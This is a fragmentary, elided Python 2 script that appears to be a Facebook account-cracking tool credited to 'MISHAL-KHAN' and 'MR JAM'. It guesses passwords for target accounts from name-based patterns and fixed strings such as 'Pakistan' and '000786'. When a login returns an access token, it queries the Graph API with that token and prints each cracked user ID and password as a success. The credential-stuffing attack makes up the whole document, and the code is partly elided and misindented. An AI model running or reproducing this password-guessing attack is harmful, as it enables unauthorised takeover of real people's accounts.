...
print  """
\033[1;97m************************************************
\033[1;96m~ I'M NOT RESPONSIBLE FOR ANY MISS USE MR JAM ~
\033[1;97m************************************************
...
def pilih_super():
	...
	if peak =="":
		...
		print "\033[1;95m•◈•══════••◈•\033[1;91mMISHAL-KHAN\033[1;95m•◈•══════••◈•"
		try:
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass1 + ' Jam '											
				oks.append(user+pass1)
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass2 + ' Jam '											
					       ...
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass3 + ' Jam '									
						       oks.append(user+pass3)
						           ...
						           pass4 = '000786'										
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass4 + ' Jam '											
						                       ...
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' Jam '							
							                           ...
							                           pass6 = 'Pakistan'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' Jam '											
								                               ...
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' Jam '					
										                           ...
										                           pass8 = b['last_name'] + '786'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass8 + ' Jam '											
										                                       ...
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;92m[Successfully] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass9 + ' Jam '			
	...
	print"\033[1;91mTotal OK/\x1b[1;95m \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"
	print """
